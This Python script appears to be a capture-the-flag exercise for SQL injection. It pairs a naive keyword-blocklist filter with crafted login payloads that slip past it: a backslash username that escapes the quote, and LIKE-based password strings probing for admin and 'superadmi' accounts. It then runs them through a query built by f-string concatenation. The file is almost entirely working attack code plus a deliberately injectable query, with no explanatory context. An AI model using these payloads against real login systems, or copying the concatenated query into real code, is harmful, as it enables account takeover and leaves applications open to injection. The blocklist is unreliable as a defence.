from db import dbConnection

loose_keywords = [
    'union', 'sleep(', 'select', 'from', 'and', 
    'or', 'superadmin', 'if', 'having', '=', '>', 
    '<',' ', '*', '/', '\n', '\r', '\t', '\x0b', 
    '\x0c', '-', '+', '|', '&', '#'
] 

strict_keywords = ['superadmin', '\'']

def loose_waf(data):
    for keyword in loose_keywords:
        if keyword in data.lower():
            print(keyword)
            return True
    return False

def strict_waf(data):
    for keyword in strict_keywords:
        if keyword in data.lower():
            print(keyword)
            return True
    return False

# whitespace => ()
# ' 

username = "admin"
password = "'^'0"

username = "\\"
# password = "^(max(username))LIKE('superadmi%');\x00"
password = "^(`username`like'ad%');\x00" # 'username'like'%')limit(1,1);\x00"
if strict_waf(username):
    print("filter 1")
    exit()
        
if loose_waf(password):
    print("filter 2")
    exit()
    
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'" 
print(sql)
connection = dbConnection()
try:
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
        user = cursor.fetchone()
        print(user['username'])
except Exception as e:
    print(e)
finally:
    if connection:
        connection.close()    